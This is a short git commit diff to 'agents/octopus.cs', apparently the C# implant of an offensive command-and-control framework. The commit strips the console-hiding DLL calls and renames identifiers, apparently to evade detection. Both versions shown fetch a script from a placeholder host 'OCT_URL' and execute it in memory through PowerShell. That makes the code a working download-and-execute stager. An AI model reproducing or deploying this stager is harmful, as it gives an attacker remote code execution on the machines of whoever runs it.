d1281f76c91e8e215a3c5f19809fed7bcbb16aa0
askar <m.askar@isecur1ty.org>
2020-03-29 18:31:34 +0300

    remove dll calls

--- agents/octopus.cs
+++ agents/octopus.cs
@@ -3,27 +3,21 @@ using System.Runtime.InteropServices;
 using System.Net;
 using System;
 
-namespace TT
+namespace TTT
 {
-    class NoT
+    class TNoT
     {
-	[DllImport("kernel32.dll")]
-	static extern IntPtr GetConsoleWindow();
-	
-	[DllImport("user32.dll")]
-	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
 
         static void Main()
         {
 
-		var Console = GetConsoleWindow();
-		ShowWindow(Console, 0);
 
-		WebClient client = new WebClient();
-		String code = client.DownloadString("OCT_URL");
-		PowerShell ps = PowerShell.Create();
-		ps.AddScript(code);
-		ps.Invoke();
+		WebClient CC = new WebClient();
+		String code = CC.DownloadString("OCT_URL");
+		PowerShell pp = PowerShell.Create();
+		pp.AddScript(code);
+		pp.Invoke();
 
 
 
